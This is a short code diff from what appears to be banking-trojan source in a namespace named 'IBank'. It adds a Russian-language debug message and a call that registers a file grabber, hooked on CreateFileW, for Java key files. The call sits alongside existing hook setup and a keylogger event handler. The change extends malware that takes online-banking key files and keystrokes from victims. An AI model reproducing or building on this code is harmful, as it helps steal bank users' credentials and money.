@@ -240,6 +240,7 @@ namespace IBank
 
 	void AddFileGrabber(FileGrabber::TypeFuncReceiver IsFileKey)
 	{
+		IBDBG("IBank", "Добавлен файл граббер");
 		FileGrabber::Init(FileGrabber::CREATEFILEW);
 		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
 		rv->FuncReceiver = IsFileKey;
@@ -301,6 +302,7 @@ namespace IBank
 			SetHooks();
 			Hooked = true;
 		}
+		AddFileGrabber(IsFileKeyJava);
 		KeyLogger::ConnectEventHandler(KLE_AFTER_SHOW_WND, IBankShowWindow );
 	}
 
